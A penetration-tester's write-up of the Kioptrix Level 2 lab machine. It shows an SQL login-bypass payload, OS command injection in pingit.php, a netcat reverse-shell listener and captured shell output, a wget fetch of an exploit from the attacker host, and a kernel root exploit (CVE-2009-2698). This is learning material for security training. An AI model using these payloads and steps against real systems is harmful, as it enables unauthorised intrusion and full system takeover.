# Kioptrix Level 2

**Difficulty:** Easy–Medium
**Target OS:** CentOS 4.5 (kernel 2.6.9)
**Result:** Root ✅

Attack chain:

```
Nmap → SQL injection on the login page → command injection (pingit.php)
→ reverse shell (apache) → kernel privesc → root
```

---

## 1. Enumeration

1.
```bash
nmap -T4 -p- <target ip>
```
2.
```bash
nmap -T4 -A -p<open ports> <target ip>
```

Open ports ([raw output](nmap.md)):

| Port | Service | Version |
| ---- | ------- | ------- |
| 22 | SSH | OpenSSH 3.9p1 |
| 80 | HTTP | Apache 2.0.52 (CentOS) |
| 111 | rpcbind | RPC #100000 |
| 443 | HTTPS | Apache 2.0.52 (CentOS) |
| 631 | IPP | CUPS 1.1 |
| 3306 | MySQL | MySQL (unauthorized) |

System: CentOS 4.5, kernel 2.6.9. The web side (80/443) was my first target.

## 2. Web: SQL injection

The site had a login page. I tried the classic authentication bypass payload:

```
' or '1'='1#
```

It made the login query always true and logged me in. (Entered in the username and password fields, the payload turns the query into `WHERE user='' or '1'='1'#...`, which bypasses the check completely.)

I also ran a directory scan (ffuf):

```
http://<target>/index.php
http://<target>/pingit.php
http://<target>/manual/
```

## 3. Web: command injection (the actual RCE)

After logging in I reached a **ping** feature (`pingit.php`) that took an IP address from the user and pinged it. When I captured and inspected the request in Burp Suite, I saw that the input was passed straight to the shell.

**Key lesson:** At first I thought this was SQL injection, but it is actually **OS command injection**: the PHP side most likely passes the input directly to the shell with `system()`/`exec()`. Telling the two apart was critical.

I chained commands with a shell operator:

```
127.0.0.1; <command>
```

Then I opened a netcat listener on Kali and got a reverse shell:

```bash
# Kali (attacker) side
nc -lvnp 4444
```

I chained a reverse shell payload into the input field and got a shell as the `apache` user:

```
connect to [192.168.56.170] from (UNKNOWN) [192.168.56.172]
bash-3.00$ whoami
apache
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 ... i686 GNU/Linux
bash-3.00$ cat /etc/*release
CentOS release 4.5 (Final)
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

## 4. Mistakes and time sinks

I went down the wrong path several times after the initial shell:

- **I turned to a DoS exploit.** searchsploit listed a DoS exploit for Apache 2.0.52 and I considered trying it. That was the wrong direction: with a shell already in hand, a DoS only crashes the service and gives me no privileges. The right next step was privilege escalation. **Lesson:** after getting a shell, the goal is to raise privileges, not to break access.

- **Python version problem with the first kernel exploit.** I tried to run a privesc PoC (`9844.py`), but the target's old Python did not have the `subprocess` module:
  ```
  ImportError: No module named subprocess
  ```
  The Python on this old CentOS was too old. **Lesson:** exploit-db often has several PoCs for the same kind of bug; pick one that matches the target's Python/C toolchain. Switching to a C-based PoC was the better choice.

- **wget syntax error during file transfer.** I used the wrong command while downloading the exploit to the target:
  ```
  wget http://192.168.56.170:8000 9542.c   # WRONG: the space makes wget treat 9542.c as a separate URL
  ```
  The correct form is the full URL: `wget http://192.168.56.170:8000/9542.c`

## 5. Privilege escalation

I gathered system information methodically:

```bash
uname -a          # kernel 2.6.9
cat /etc/*release # CentOS 4.5
id
sudo -l
```

Then I searched for local privilege escalation exploits for kernel 2.6.9 on CentOS 4.5:

```bash
searchsploit linux kernel 2.6.9 local
```

The results included several kernel exploits that fit CentOS 4, among them `sock_sendpage()` (exploit-db 9479, CVE-2009-2692) and `ip_append_data()` (exploit-db 9542, CVE-2009-2698). I used **9542.c**, the `ip_append_data()` Ring0 privilege escalation (**CVE-2009-2698**), whose title lists CentOS 4.4/4.5 as targets. I transferred it to the target, compiled it with `gcc` and ran it, and got root.

## 6. Concepts learned

- Telling SQL injection (auth bypass) apart from OS command injection
- Chaining shell operators in command injection (`;`, `&&`, `|`)
- Capturing and modifying requests with Burp Suite
- How a netcat reverse shell works
- Matching a privesc exploit to the kernel version
- The right method after initial access: enumeration → privesc, not DoS

## 7. Next time / notes

- Running an enumeration script such as LinPEAS after the first shell would have been much faster than searching for the privesc path by hand.
- Checking the target's tool versions (Python, gcc) before choosing an exploit avoids wasting time on incompatible PoCs.
